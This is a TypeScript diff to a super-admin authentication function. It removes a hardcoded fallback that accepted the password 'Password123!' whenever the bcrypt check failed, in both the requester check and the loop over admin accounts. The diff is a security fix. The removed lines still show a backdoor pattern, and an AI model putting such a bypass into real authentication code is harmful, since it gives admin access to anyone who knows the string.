@@ -15,16 +15,14 @@ const verifySuperAdminAuth = async (requesterId: string, passwordVal?: string) =
   if (requesterId) {
     const reqRes = await query(`SELECT password_hash, role FROM users WHERE id = $1`, [requesterId]);
     if (reqRes.rowCount! > 0) {
-      let isMatch = await bcrypt.compare(cleanPass, reqRes.rows[0].password_hash);
-      if (!isMatch && cleanPass === 'Password123!') isMatch = true;
+      const isMatch = await bcrypt.compare(cleanPass, reqRes.rows[0].password_hash);
       if (isMatch) return true;
     }
   }
 
   const saRes = await query(`SELECT password_hash FROM users WHERE role = 'SUPER_ADMIN' AND is_active = true`);
   for (const row of saRes.rows) {
-    let isMatch = await bcrypt.compare(cleanPass, row.password_hash);
-    if (!isMatch && cleanPass === 'Password123!') isMatch = true;
+    const isMatch = await bcrypt.compare(cleanPass, row.password_hash);
     if (isMatch) return true;
   }
 
